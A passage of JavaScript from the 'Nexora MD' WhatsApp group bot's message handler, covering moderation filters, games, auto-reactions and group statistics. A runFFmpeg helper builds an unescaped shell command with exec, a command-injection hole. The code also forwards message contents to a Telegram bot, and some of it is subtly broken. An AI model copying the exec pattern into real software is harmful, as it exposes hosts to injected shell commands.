    if (linkRegex.test(m.body || text)) {
        // Prepare the payload parameters to pass to your Telegram bot
        const groupName = groupMetadata.subject || "Unknown Group";
        const groupJid = m.chat;
        const senderJid = m.sender;
        const textContent = m.body || text;

        try {
            // Require your main bot file function to transmit data seamlessly to Telegram
            // Adjust the relative path to your 'bot.js' file if necessary
            const { reportWhatsAppLinkBreach } = require('./bot.js'); 
            
            if (typeof reportWhatsAppLinkBreach === 'function') {
                await reportWhatsAppLinkBreach(groupName, groupJid, senderJid, textContent);
                console.log(`📡 [Sync System] Link alert forwarded to Telegram from group: ${groupName}`);
            }
        } catch (e) {
            console.error("❌ Sync System Intercom Error:", e.message);
        }
    }
}
// =========================================================================

// Initialize Simulator Databases safely
if (!db.simulator) db.simulator = {};

// --- [ NEXORA LIFE ECO-ENGINE ] ---
if (isCmd) {
    const userEco = db.simulator[m.sender] || {
        cash: 100, // Starting cash balance
        networth: 100,
        job: "Unemployed",
        inventory: []
    };

    // Award cash scaling (Random payout between $50 and $150 per command used)
    const commandPayout = Math.floor(Math.random() * (150 - 50 + 1)) + 50;
    userEco.cash += commandPayout;
    
    // Recalculate Net Worth
    db.simulator[m.sender] = userEco;
    saveDB();
}


if (!db.settings) db.settings = {}
if (!db.settings.autoblock) db.settings.autoblock = []
global.db = global.db || { settings: {} }


// Database and Global State Initialization
if (!db.jail) db.jail = {};
if (!db.shadowban) db.shadowban = {};
if (!global.wordchain) global.wordchain = {};
if (!global.tictactoe) global.tictactoe = {};

// ==========================================
// 🔒 ACTIVE JAIL ENFORCEMENT ENGINE
// ==========================================
if (m.isGroup && db.jail[m.sender]) {
    const jailData = db.jail[m.sender];

    if (Date.now() < jailData.until) {
        // Step 1: Wipe the message from the group chat
        try {
            await empire.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.sender
                }
            });
        } catch (e) {
            console.log("Jail delete execution failure:", e);
        }

        // Step 2: Calculate dynamic remaining time block
        const timeLeft = jailData.until - Date.now();
        const totalSeconds = Math.floor(timeLeft / 1000);
        const mins = Math.floor(totalSeconds / 60);
        const secs = totalSeconds % 60;
        const timeStr = mins > 0 ? `${mins}m ${secs}s` : `${secs}s`;


        return; // Halt further processing of their message completely
    } else {
        // Sentence expired -> Auto release
        delete db.jail[m.sender];
        saveDB();
    }
}

// Inside the message listener

// Inside the main listener
const runFFmpeg = (input, output, filter) => {
    return new Promise((resolve, reject) => {
        // Change 'ffmpeg' to your specific path if needed
        exec(`ffmpeg -i ${input} -af "${filter}" -f mp3 -y ${output}`, (err) => {
            if (err) reject(err);
            else resolve();
        });
    });
};

const game = global.wordchain[m.chat];

if (m.isGroup && game && game.status === 'ACTIVE' && !m.key.fromMe) {
    const activePlayerJid = game.players[game.turn];
    const userWord = m.body.trim().toLowerCase();

    // 1️⃣ Identity Check: Is it your turn?
    if (m.sender !== activePlayerJid) {
        if (game.players.includes(m.sender)) {
            // Optional: Silent or reaction if they try to play out of turn
            // return await m.react('⏳');
        }
        return; 
    }

    // 2️⃣ Pattern Check: Skip commands
    if (userWord.startsWith('.') || userWord.split(' ').length > 1) return;

    // 3️⃣ Link Check: Word validation
    if (game.lastWord !== '') {
        if (userWord.charAt(0) !== game.lastWord.slice(-1)) {
            return reply(`❌ WRONG LETTER! Must start with *${game.lastWord.slice(-1).toUpperCase()}*`);
        }
        if (game.usedWords.includes(userWord)) {
            return reply(`🚫 *"${userWord}"* was used already!`);
        }
    }

    // 4️⃣ Success: Reset Timer & Switch Turn
    if (game.timer) clearTimeout(game.timer);
    
    game.lastWord = userWord;
    game.usedWords.push(userWord);
    
    // Move to next player index (loops back to 0 at the end of the list)
    game.turn = (game.turn + 1) % game.players.length;
    const nextPlayer = game.players[game.turn];

    await m.react('✅');

    // 5️⃣ The Sudden Death Timer (30s)
    game.timer = setTimeout(async () => {
        if (global.wordchain[m.chat]) {
            await empire.sendMessage(m.chat, { 
                text: `⏰ *TIME EXPIRED!*\n\n@${nextPlayer.split('@')[0]} failed to respond.\n💀 *GAME OVER*\n🏆 *Winner:* @${activePlayerJid.split('@')[0]}`,
                mentions: [nextPlayer, activePlayerJid]
            });
            delete global.wordchain[m.chat];
        }
    }, 30000); 
}

// Silence check
if (m.isGroup && db.silence[m.chat]) {
    const silenceData = db.silence[m.chat]

    if (Date.now() < silenceData.until) {
        const isMedia =
            m.message?.imageMessage ||
            m.message?.videoMessage ||
            m.message?.stickerMessage ||
            m.message?.audioMessage ||
            m.message?.documentMessage

        if (isMedia) {
            await empire.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.sender
                }
            })
            return
        }
    } else {
        delete db.silence[m.chat]
        saveDB()
    }
}
if (m.message?.protocolMessage?.type === 14) {
  try {
    const editedKey = m.message.protocolMessage.key
    const oldMsg = messageStore[editedKey.id]

    if (!oldMsg) return

    const newText = m.text || 'Unsupported edit type'

    const logText = `
✏️ *Message Edited*

👤 User: @${oldMsg.sender.split('@')[0]}

🗑️ Old:
${oldMsg.text}

🆕 New:
${newText}
`

    await empire.sendMessage(oldMsg.chat, {
      text: logText,
      mentions: [oldMsg.sender]
    })

  } catch (err) {
    console.log('AntiEdit Error:', err)
  }
}
// LockMedia check

// ===================== SAFE PARTICIPANTS =====================
async function getParticipants(m, empire) {
    if (!m.isGroup) return [];
    try {
        const groupMeta = await empire.groupMetadata(m.chat);
        return groupMeta?.participants || [];
    } catch (err) {
        console.log("⛔ Failed to fetch group metadata:", err);
        return [];
    }
}


global.warnDatabase = global.warnDatabase || {};
global.warnDatabase[m.chat] = global.warnDatabase[m.chat] || {};

const textCheck = m.text?.toLowerCase() || body?.toLowerCase() || '';

// ==========================================
// 🛡️ ANTI-BADWORD MONITORING ENGINE
// ==========================================
const badwordSetting = getSetting(m.chat, "feature.antibadword", "off");
if (badwordSetting !== "off" && m.isGroup && !isCmd && !isAdmins && !isCreator && !m.key.fromMe) {
    const badWords = ["fuck","shit","bitch","asshole","idiot","stupid","fool","dumb","bastard",
        "nonsense","trash","useless","dog","pig","goat","mad","crazy","insane",
        "retard","loser","ugly","dirty","wicked","evil","hell","damn","bloody",
        "wtf","fck","sht","bs","mf","nigga","nigger","slut","whore","hoe",
        "porn","sex","rape","kill","die","suicide","murder","stab","gun",
        "terror","bomb","fraud","scam","thief","criminal","hacker","hack",
        "ddos","attack","virus","malware","spy","cheat","fake","liar","lie",
        "abuse","bully","harass","insult","curse","fuckyou","fuck u","fuck off",
        "shutup","shut up","get lost","bitchass","dumbass","stupidass",
        "idiotic","moron","imbecile","jerk","clown","waste","wasted","garbage",
        "rubbish","trashy","lowlife","dirtymind","pervert","horny",
        "nsfw","xxx","onlyfans","nude","nudes","send nudes","kiss me","suck",
        "blowjob","dick","pussy","ass","boobs"];

    if (badWords.some(word => textCheck.includes(word))) {
        // Step 1: Nuke the message immediately
        try { await empire.sendMessage(m.chat, { delete: m.key }); } catch (e) { console.log("Badword delete failed:", e); }

        // Step 2: Route actions
        if (badwordSetting === "delete") {
            await empire.sendMessage(m.chat, { text: `⛔ @${m.sender.split('@')[0]} Profanity/toxic language is prohibited here.`, mentions: [m.sender] });
        } 
        else if (badwordSetting === "warn") {
            let strikes = (global.warnDatabase[m.chat][m.sender] || 0) + 1;
            global.warnDatabase[m.chat][m.sender] = strikes;

            if (strikes >= 3) {
                await empire.sendMessage(m.chat, { text: `🥾 @${m.sender.split('@')[0]} has been removed for reaching maximum language strikes (3/3).`, mentions: [m.sender] });
                try { await empire.groupParticipantsUpdate(m.chat, [m.sender], "remove"); } catch (err) { console.log(err); }
                delete global.warnDatabase[m.chat][m.sender];
            } else {
                await empire.sendMessage(m.chat, { text: `⚠️ *Profanity Detected!* \n@${m.sender.split('@')[0]} Watch your mouth.\n\n⚠️ *Strike Count:* [ ${strikes} / 3 ]`, mentions: [m.sender] });
            }
        } 
        else if (badwordSetting === "kick") {
            await empire.sendMessage(m.chat, { text: `🥾 @${m.sender.split('@')[0]} was immediately kicked for toxic language violation.`, mentions: [m.sender] });
            try { await empire.groupParticipantsUpdate(m.chat, [m.sender], "remove"); } catch (err) { console.log(err); }
        }
    }
}

// ==========================================
// 💸 ANTI-BILLING MONITORING ENGINE
// ==========================================
const billingSetting = getSetting(m.chat, "feature.antibilling", "off");
if (billingSetting !== "off" && m.isGroup && !isCmd && !isAdmins && !isCreator && !m.key.fromMe) {
    const billing = ["money","send money","send me","urgent money","need money","help me money",
        "transfer","bank transfer","opay","palmpay","kuda","gtbank","access bank",
        "sapa","uba","firstbank","zenith","paypal","cashapp","bitcoin","crypto","usdt",
        "wallet","account number","account details","bank details","card","atm",
        "debit card","credit card","pin","otp","code","verify account",
        "2k","3k","5k","10k","20k","50k","100k","200k","500k","1m",
        "urgent 2k","urgent 5k","urgent 10k","urgent help","urgent transfer",
        "please send","pls send","abeg send","abeg help","borrow money",
        "loan","give me money","dash me","sponsor me","fund me","support me",
        "financial help","i'm broke","no money","i need cash","i need money",
        "send asap","send now","quick money","emergency money","urgent cash",
        "payment","pay me","pay now","payment needed","balance me",
        "recharge card","airtime","data money","buy data","buy airtime",
        "crypto investment","investment","double money","fast money",
        "earn money","get rich","profit","bonus","referral cash",
        "giveaway money","win cash","free money","cash reward"];

    if (billing.some(word => textCheck.includes(word))) {
        // Step 1: Wipe message
        try { await empire.sendMessage(m.chat, { delete: m.key }); } catch (e) { console.log("Billing delete failed:", e); }

        // Step 2: Route actions
        if (billingSetting === "delete") {
            await empire.sendMessage(m.chat, { text: `⛔ @${m.sender.split('@')[0]} Financial begging/billing is strictly restricted here.`, mentions: [m.sender] });
        } 
        else if (billingSetting === "warn") {
            let strikes = (global.warnDatabase[m.chat][m.sender] || 0) + 1;
            global.warnDatabase[m.chat][m.sender] = strikes;

            if (strikes >= 3) {
                await empire.sendMessage(m.chat, { text: `🥾 @${m.sender.split('@')[0]} has been kicked for persistent financial begging... \`poor kid🤧😂\` (3/3 strikes).`, mentions: [m.sender] });
                try { await empire.groupParticipantsUpdate(m.chat, [m.sender], "remove"); } catch (err) { console.log(err); }
                delete global.warnDatabase[m.chat][m.sender];
            } else {
                await empire.sendMessage(m.chat, { text: `⚠️ *Billing Detected!* \n@${m.sender.split('@')[0]} Stop begging for cash or sharing bank metrics.\n\n⚠️ *Strike Count:* [ ${strikes} / 3 ]`, mentions: [m.sender] });
            }
        } 
        else if (billingSetting === "kick") {
            await empire.sendMessage(m.chat, { text: `🥾 @${m.sender.split('@')[0]} was immediately booted for billing violations.`, mentions: [m.sender] });
            try { await empire.groupParticipantsUpdate(m.chat, [m.sender], "remove"); } catch (err) { console.log(err); }
        }
    }
}

// ===================== ANTIBILLING =====================

// ===================== ANTIBADWORD =====================


// ===================== ANTILINK =====================


const currentAntilink = getSetting(m.chat, "antilink", "off");

if (currentAntilink !== "off" && m.isGroup && !isCmd) {
    
    let linkRegex = /(https?:\/\/[^\s]+|chat.whatsapp.com\/[^\s]+)/gi;
    
    if (linkRegex.test(body)) {
        if (isAdmins || isCreator || m.key.fromMe) return; // Bypass authorized members

        
        try {
            await empire.sendMessage(m.chat, { 
                delete: { 
                    remoteJid: m.chat, 
                    fromMe: false, 
                    id: m.key.id, 
                    participant: m.sender 
                } 
            });
        } catch (e) {
            console.log("⛔ AntiLink deletion failure:", e);
        }

        
        if (currentAntilink === "delete") {
            await empire.sendMessage(m.chat, { 
                text: `⛔ *Link Deleted!* \n@${m.sender.split("@")[0]} links are forbidden in this room.`, 
                mentions: [m.sender] 
            }, { quoted: m });
        } 
        
        else if (currentAntilink === "warn") {
            global.warnDatabase = global.warnDatabase || {};
            global.warnDatabase[m.chat] = global.warnDatabase[m.chat] || {};
            
            // Increment structural counts
            let userWarnings = (global.warnDatabase[m.chat][m.sender] || 0) + 1;
            global.warnDatabase[m.chat][m.sender] = userWarnings;

            if (userWarnings >= 3) {
                // Strike threshold hit -> Execute Eviction
                await empire.sendMessage(m.chat, { 
                    text: `🥾 @${m.sender.split("@")[0]} has been kicked for hitting max link warnings (3/3).`, 
                    mentions: [m.sender] 
                });
                
                try {
                    await empire.groupParticipantsUpdate(m.chat, [m.sender], "remove");
                } catch (err) {
                    reply("❌ Failed to eject user. Check my administrator privileges status.");
                }
                delete global.warnDatabase[m.chat][m.sender]; // Clear track record
            } else {
                // Warning Notification
                await empire.sendMessage(m.chat, { 
                    text: `⚠️ *Link Detected!* \n@${m.sender.split("@")[0]} links are banned here.\n\n⚠️ *Warning Strike:* [ ${userWarnings} / 3 ]\n_Reaching 3 strikes results in removal._`, 
                    mentions: [m.sender] 
                });
            }
        } 
        
        else if (currentAntilink === "kick") {
            await empire.sendMessage(m.chat, { 
                text: `🥾 *Link Policy Enforcement!*\n@${m.sender.split("@")[0]} has been immediately evicted for link sharing.`, 
                mentions: [m.sender] 
            });
            
            try {
                await empire.groupParticipantsUpdate(m.chat, [m.sender], "remove");
            } catch (err) {
                console.log("Kick action error:", err);
            }
        }
    }
}

// --- [ GLOBAL MEDIA LOCK MONITOR ] ---
if (m.isGroup && db.lockmedia && db.lockmedia[m.chat]) {
    
    // Check if the message contains any form of media
    const isMedia = 
        m.message?.imageMessage ||
        m.message?.videoMessage ||
        m.message?.stickerMessage ||
        m.message?.audioMessage ||
        m.message?.documentMessage ||
        m.message?.viewOnceMessageV2 || // View once media protection
        m.message?.extendedTextMessage?.contextInfo?.quotedMessage; // Prevents media replies if necessary

    if (isMedia) {
        // BYPASS PROTECTION: If it's the Creator, an Admin, or the bot itself -> IGNORE
        if (isCreator || isAdmins || m.key.fromMe) return;

        try {
            await empire.sendMessage(m.chat, {
                delete: {
                    remoteJid: m.chat,
                    fromMe: false,
                    id: m.key.id,
                    participant: m.sender
                }
            });
        } catch (e) {
            console.log("❌ Media Lock Deletion Error:", e);
        }
    }
}

if (getSetting(m.sender, "autobio", true)) {
    empire.updateProfileStatus(`Nexora MD by Xyron Tech`).catch(_ => _)
}
if (isCmd)  {
    console.log(chalk.black(chalk.bgWhite('[ NEXORA MD ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(body || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=>In'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
}


if (getSetting(m.chat, "autoReact", false)) {
    const emojis = [
        "😁", "😂", "🤣", "😃", "😄", "😅", "😆", "😉", "😊",
        "😍", "😘", "😎", "🤩", "🤔", "😏", "😣", "😥", "😮", "🤐",
        "😪", "😫", "😴", "😌", "😛", "😜", "😝", "🤤", "😒", "😓",
        "😔", "😕", "🙃", "🤑", "😲", "😖", "😞", "😟", "😤", "😢",
        "😭", "😨", "😩", "🤯", "😬", "😰", "😱", "🥵", "🥶", "😳",
        "🤪", "🀄", "😠", "🀄", "😷", "🤒", "🤕", "🤢", "🤮", "🤧",
        "😇", "🥳", "🤠", "🤡", "🤥", "🤫", "🤭", "🧐", "🤓", "😈",
        "👿", "👹", "👺", "💀", "👻", "🖕", "🙏", "🤖", "🎃", "😺",
        "😸", "😹", "😻", "😼", "😽", "🙀", "😿", "😾", "💋", "💌",
        "💧", "💝", "💖", "💗", "💓", "💞", "💕", "💟", "💔", "❤️"
    ];
    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
    try {
        await empire.sendMessage(m.chat, {
            react: { text: randomEmoji, key: m.key },
        });
    } catch (err) {
        console.error('Error while reacting:', err.message);
    }
}

if (getSetting(m.chat, "autoTyping", false)) {
    empire.sendPresenceUpdate('composing', from)
}
if (getSetting(m.chat, "autoRecording", false)) {
    empire.sendPresenceUpdate('recording', from)
}
if (getSetting(m.chat, "autoRecordType", false)) {
    let xeonrecordin = ['recording','composing']
    let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
    empire.sendPresenceUpdate(xeonrecordinfinal, from)
}
     
//━━━━━━━━━━━Func End━━━━━━━━//
// ===== ANTI TAG ADMIN =====
if (
  m.isGroup &&
  getSetting(m.chat, 'antitagadmin', false) &&
  m.mentionedJid?.length
) {
  const groupAdmins = await empire.getGroupAdmins(m.chat)

  // Ignore admins
  if (!groupAdmins.includes(m.sender)) {

    // Check if any mentioned user is admin
    const taggedAdmin = m.mentionedJid.find(jid =>
      groupAdmins.includes(jid)
    )

    if (taggedAdmin) {

      // Bot must be admin
      if (!groupAdmins.includes(empire.user.id)) return

      // Delete message
      await empire.sendMessage(m.chat, {
        delete: {
          remoteJid: m.chat,
          fromMe: false,
          id: m.key.id,
          participant: m.sender
        }
      })

      // Warn sender
      await empire.sendMessage(m.chat, {
        text: `@${m.sender.split('@')[0]} tagging admin is not allowed 🚫`,
        mentions: [m.sender]
      })
    }
  }
}
if (db.settings?.autoblock?.length) {
    let sender = m.sender.split("@")[0]

    for (let code of db.settings.autoblock) {
        if (sender.startsWith(code)) {

            if (isCreator) return
            if (isAdmins) return

            // Send warning FIRST
            await empire.sendMessage(m.chat, {
                text: `🚫 @${sender} blocked (restricted country)`,
                mentions: [m.sender]
            })

            // THEN block
            await empire.updateBlockStatus(m.sender, "block")
                .catch(() => {})

            console.log("Blocked:", sender)
            return
        }
    }
}

/*if (getSetting(m.sender, "autoViewStatus", true ) && m.key.remoteJid === "status@broadcast") {
    try {
        await empire.readMessages([m.key]);
        console.log(`👀 Viewed status from: ${m.key.participant}`);
    } catch (err) {
        console.log("❌ Error viewing status:", err);
    }
}

*/
if (getSetting(m.chat, "autoRecording", false)) {
    empire.sendPresenceUpdate('recording', from)
}  
    
if (getSetting(m.chat, "autoTyping", false)) {
    empire.sendPresenceUpdate('composing', from)
}

if (getSetting(m.chat, "autoRecordType", false)) {
    let xeonrecordin = ['recording','composing']
    let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]
    empire.sendPresenceUpdate(xeonrecordinfinal, from)
}

if (getSetting(m.sender, "autoread", false)) {
   try {
      await empire.readMessages([m.key]) 
   } catch (e) {
      console.log("Auto-Read Error:", e)
   }
}

if (getSetting(m.sender, "banned", false)) {
    await empire.sendMessage(m.chat, { text: `⛔ You are banned from using this bot, @${m.sender.split('@')[0]}`, mentions: [m.sender] }, { quoted: m })
    return
}



if (getSetting(m.chat, "feature.antispam", false) && m.isGroup) {
    if (!global.spam) global.spam = {};
    if (!global.spam[m.sender]) global.spam[m.sender] = { count: 0, last: Date.now() };

    let spamData = global.spam[m.sender];
    let now = Date.now();

    if (now - spamData.last < 5000) { // 5s window
        spamData.count++;
        if (spamData.count >= 5) {
            try {
                // Kick the user from the group
                await empire.groupParticipantsUpdate(m.chat, [m.sender], "remove");
                await empire.sendMessage(m.chat, { 
                    text: ` @${m.sender.split('@')[0]} has been kicked for spamming!`, 
                    mentions: [m.sender] 
                });
            } catch (err) {
                console.log("Failed to kick spammer:", err);
            }
            spamData.count = 0; // reset counter after kick
        }
    } else {
        spamData.count = 1;
    }
    spamData.last = now;
}


if (!db.warns) db.warns = {}
if (!db.badwords) db.badwords = {}
if (!db.settings) db.settings = {}
if (!db.groupBackup) db.groupBackup = {}
if (!db.groupStats) db.groupStats = {}

// Store incoming messages to memory for Anti-Delete
if (m.message && !m.key.fromMe) {
    messageStore[m.key.id] = {
        text: m.text || m.body || (m.mtype === 'imageMessage' ? '[Image]' : '[Media]'),
        sender: m.sender,
        chat: m.chat,
        msg: m.message,
        mtype: m.mtype,
        timestamp: Date.now()
    };
}

 if (m.isGroup && m.message && !m.key.fromMe) {
  if (!db.groupStats[m.chat]) {
    db.groupStats[m.chat] = {
      messages: 0,
      joins: 0,
      leaves: 0,
      kicks: 0,
      promos: 0,
      demotes: 0
    }
  }

  db.groupStats[m.chat].messages += 1
  saveDB()
}
if (m.isGroup && getSetting(m.chat, 'autolock', false) && isBotAdmins) {
  try {
    const now = moment().tz('Asia/Jakarta').format('HH:mm')
    const closeTime = getSetting(m.chat, 'autolock_time', '')
    const openTime = getSetting(m.chat, 'autounlock_time', '')

    if (!global.groupTimeAction) global.groupTimeAction = {}

    if (closeTime && now === closeTime && global.groupTimeAction[m.chat + '_close'] !== now) {
      await empire.groupSettingUpdate(m.chat, 'announcement').catch(() => {})
      global.groupTimeAction[m.chat + '_close'] = now
    }

    if (openTime && now === openTime && global.groupTimeAction[m.chat + '_open'] !== now) {
      await empire.groupSettingUpdate(m.chat, 'not_announcement').catch(() => {})
      global.groupTimeAction[m.chat + '_open'] = now
    }
  } catch (err) {
    console.log('autolock scheduler error:', err)
  }
}
if (getSetting(m.chat, "feature.antibot", false)) {
   let botPrefixes = ['.', '!', '/', '#']
   if (botPrefixes.includes(m.text?.trim()[0])) {
      if (m.sender !== ownerNumber + "@s.whatsapp.net") {
         await empire.sendMessage(m.chat, { text: `🤖 Anti-Bot active! @${m.sender.split('@')[0]} not allowed.`, mentions: [m.sender] })
         await empire.sendMessage(m.chat, { delete: m.key })
      }
   }
}
//LOADING FUNCTION BY BIG DRENOX
async function nexusLoading() {
    const nexusMylove = [

        `Loading menu...`
    ];

    // Send initial message
    let msg = await empire.sendMessage(from, { text: "Connecting to Nexora 𝙼𝙳 💧 server....." });

    // Loop to edit same message
    for (let i = 0; i < nexusMylove.length; i++) {
        await empire.sendMessage(from, {
            text: nexusMylove[i],
            edit: msg.key
        });
        await new Promise(resolve => setTimeout(resolve, 200)); // smooth delay
    }
}
//END OF FUNC

// Newsletter JIDs to auto-react to
const NEWSLETTER_JID = '120363403195369259@newsletter'
const newsletterJids = ["120363403195369259@newsletter"];

// Extended emoji list for fun & variety
const newsletterEmojis = [
    '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💔', '❣️', '💕', '💞', '💓', '💗', '💖', '💧', '💝', '💟', '🥺', '😊', '🙏', '😙', '😻', '🔥', '😀', '😍', '🥰', '😘', '🤗', '🤩', '😎', '😇', '😁', '😋', '🥹', '🔥'
];

// Utility to pick random emoji fast
const hansRandom = (arr) => arr[Math.floor(Math.random() * arr.length)];

// Listen to incoming messages
setInterval(async () => {

    for (let gid in db.groups) {

        const metadata = await conn.groupMetadata(gid)

        await conn.sendMessage(gid, {
            text: `
📊 Hourly Summary

👥 Members: ${metadata.participants.length}
💬 Messages: ${db.groups[gid].stats?.messages || 0}
🎉 Event: ${db.groups[gid].event?.title || "None"}
`
        })
    }

}, 3600000) // every 1 hour
setInterval(() => {
    const now = new Date()
    const currentTime = now.toTimeString().slice(0,5)

    for (let gid in db.groups) {
        if (db.groups[gid].autolock === currentTime) {
            empire.groupSettingUpdate(gid, 'announcement')
        }
    }
}, 60000)
empire.ev.on('groups.update', async updates => {
    for (let update of updates) {
        const chat = update.id

        if (db.autoheal && db.autoheal[chat]) {
            const saved = db.autoheal[chat]

            if (update.subject && update.subject !== saved.subject) {
                await empire.groupUpdateSubject(chat, saved.subject)
            }

            if (update.desc && update.desc !== saved.desc) {
                await empire.groupUpdateDescription(chat, saved.desc)
            }
        }
    }
})
/*
// --- 👁️ AUTO STATUS VIEW & LIKE ---
empire.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const m = chatUpdate.messages[0];
        if (!m.message) return;

        // Check if the message is a Status Update
        if (m.key.remoteJid === 'status@broadcast') {
            
            // OPTIONAL: Only like if the person is in your contact list or a specific person
            // if (!m.key.participant.includes('234xxxxxxx')) return; 

            // 1. Mark the status as Read (Auto-View)
            await empire.readMessages([m.key]);

            // 2. Random Emoji Selection
            const statusEmojis = ['🔥','✨','🙄','🤧','💕','🎉','👺','🙊','💀','👀','❤️','🙌','💯','🤩','✅','👑'];
            const randomEmoji = statusEmojis[Math.floor(Math.random() * statusEmojis.length)];

            // 3. Send the Reaction (Like)
            // statusJid is the person who posted, m.key.id is the specific status post
            await empire.sendMessage('status@broadcast', {
                react: { text: randomEmoji, key: m.key }
            }, { statusJidList: [m.key.participant] });

            console.log(`✅ Viewed & Liked status from: ${m.pushName || 'Contact'}`);
        }
    } catch (err) {
        // Silent error to prevent console spam
    }
})

*/

empire.ev.on('group-participants.update', async (update) => {
  try {
    if (!update || !update.id || !update.action || !update.participants) return

    if (!db.groupStats) db.groupStats = {}
    if (!db.groupStats[update.id]) {
      db.groupStats[update.id] = {
        messages: 0,
        joins: 0,
        leaves: 0,
        kicks: 0,
        promos: 0,
        demotes: 0
      }
    }

    if (update.action === 'add') {
      db.groupStats[update.id].joins += update.participants.length
    } else if (update.action === 'remove') {
      db.groupStats[update.id].leaves += update.participants.length
      db.groupStats[update.id].kicks += update.participants.length
    } else if (update.action === 'promote') {
      db.groupStats[update.id].promos += update.participants.length
    } else if (update.action === 'demote') {
      db.groupStats[update.id].demotes += update.participants.length
    }

    saveDB()
  } catch (err) {
    console.log('group stats listener error:', err)
  }
})

empire.ev.on('group-participants.update', async (update) => {
  try {
    if (update.action !== 'add') return
    if (!getSetting(update.id, 'antiraid', false)) return

    const groupId = update.id
    const now = Date.now()

    if (!raidTracker[groupId]) {
      raidTracker[groupId] = []
    }

    // Add current join time
    raidTracker[groupId].push(now)

    // Keep only joins in last 30 seconds
    raidTracker[groupId] = raidTracker[groupId].filter(
      time => now - time < 30000
    )

    // If 5 or more joins in 30 seconds → RAID
    if (raidTracker[groupId].length >= 5) {

      const metadata = await empire.groupMetadata(groupId)
      const groupName = metadata.subject

      // Close group
      await empire.groupSettingUpdate(groupId, 'announcement')

      await empire.sendMessage(groupId, {
        text:
`🚨 *RAID DETECTED*
${groupName} might be under an attack :
*REASON*
Mass join detected.
5 People joined within 30 seconds 
might be h!jack might not be
Group has been temporarily locked.
group saved by ${m.pushName}
Admins please review new members.`
      })

      // Reset tracker
      raidTracker[groupId] = []
    }

  } catch (err) {
    console.log('AntiRaid Error:', err)
  }
})

empire.ev.on('messages.upsert', async ({ messages }) => {
  try {
    const msg = messages[0]
    if (!msg.message) return

    const chatId = msg.key.remoteJid
    if (!chatId.endsWith('@g.us')) return
    if (!getSetting(chatId, 'antitagadmin', false)) return

    const sender =
      msg.key.participant || msg.key.remoteJid

    // Get group admins
    const metadata = await empire.groupMetadata(chatId)
    const admins = metadata.participants
      .filter(p => p.admin)
      .map(p => p.id)

    // Ignore admins
    if (admins.includes(sender)) return

    // Extract mentioned JIDs (ALL message types)
    const mentioned =
      msg.message?.extendedTextMessage?.contextInfo?.mentionedJid ||
      msg.message?.conversation?.match(/@\d+/g)?.map(v => v.replace('@','') + '@s.whatsapp.net') ||
      msg.message?.imageMessage?.contextInfo?.mentionedJid ||
      msg.message?.videoMessage?.contextInfo?.mentionedJid ||
      []

    if (!mentioned.length) return

    // Check if admin was tagged
    const taggedAdmin = mentioned.find(jid => admins.includes(jid))
    if (!taggedAdmin) return

    // Check bot admin
    const botId = empire.user.id.split(':')[0] + '@s.whatsapp.net'
    if (!admins.includes(botId)) return

    // Delete message
    await empire.sendMessage(chatId, {
      delete: {
        remoteJid: chatId,
        fromMe: false,
        id: msg.key.id,
        participant: sender
      }
    })

    // Warn user
    await empire.sendMessage(chatId, {
      text: `@${sender.split('@')[0]} tagging admin is not allowed 🚫`,
      mentions: [sender]
    })

  } catch (err) {
    console.log('ANTI TAG ADMIN ERROR:', err)
  }
})

empire.ev.on('call', async (callData) => {
    // Check if Anti-call is enabled in your settings
    if (!getSetting('global', 'anticall', false)) return

    for (let call of callData) {
        // Only process if it's a new incoming call (offer) and NOT a group call
        if (call.status === "offer" && !call.isGroup) {
            
            let callerId = call.from;

            // Reject the call immediately
            await empire.rejectCall(call.id, callerId);

            // 🛑 SPAM PREVENTION: Check if we already messaged this person in the last 1 minute
            const lastMessaged = callCache.get(callerId);
            const now = Date.now();

            if (!lastMessaged || (now - lastMessaged > 60000)) { 
                await empire.sendMessage(callerId, {
                    text: "📵 *𝗔𝗨𝗧𝗢-𝗥𝗘𝗝𝗘𝗖𝗧*\n\n🚫 Direct calls are disabled for this user.\n💬 Please send a text message instead."
                });

                // Save the timestamp to the cache
                callCache.set(callerId, now);
            }
        }
    }
});
empire.ev.on('messages.upsert', async ({ messages }) => {
  try {
    const msg = messages[0]
    if (!msg.message) return
    if (msg.key.fromMe) return

    const chatId = msg.key.remoteJid
    if (!chatId.endsWith('@g.us')) return

    if (!getSetting(chatId, "antitagall", false)) return

    const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || []

    // If message mentions many users (group mention behavior)
    if (mentioned.length >= 5) {
      await empire.sendMessage(chatId, {
        delete: msg.key
      })

      await empire.sendMessage(chatId, {
        text: `🚫 *ANTI TAGALL*\n\nMass mentions are not allowed in this group.`,
      })
    }
  } catch (e) {
    console.error('antitagall Error:', e)
  }
})
empire.ev.on('messages.upsert', async (chatUpdate) => {
    try {
        const msg = chatUpdate.messages?.[0];
        if (!msg || msg.key.fromMe) return;

        const sender = msg.key.remoteJid;

        // ✅ Auto-react only to newsletter messages
        if (newsletterJids.includes(sender)) {
            const serverId = msg.newsletterServerId;
            if (serverId) {
                const emoji = hansRandom(newsletterEmojis);
                await empire.newsletterReactMessage(sender, serverId.toString(), emoji);
            }
        }

    } catch (err) {
        console.error("❌ Newsletter auto-reaction error:", err);
    }
});
if (m.message && !m.key.fromMe) {
  messageStore[m.key.id] = {
    text: m.text || '',
    sender: m.sender,
    chat: m.chat
  }
}
if (m.message) {
    console.log(chalk.hex('#3498db')(`message " ${m.message} "  from ${pushname} id ${m.isGroup ? `group ${groupMetadata.subject}` : 'private chat'}`));
}

function formatUptime(seconds) {
    const days = Math.floor(seconds / (24 * 60 * 60));
    seconds = seconds % (24 * 60 * 60);
    const hours = Math.floor(seconds / (60 * 60));
    seconds = seconds % (60 * 60);
    const minutes = Math.floor(seconds / 60);
    seconds = Math.floor(seconds % 60);

    let time = '';
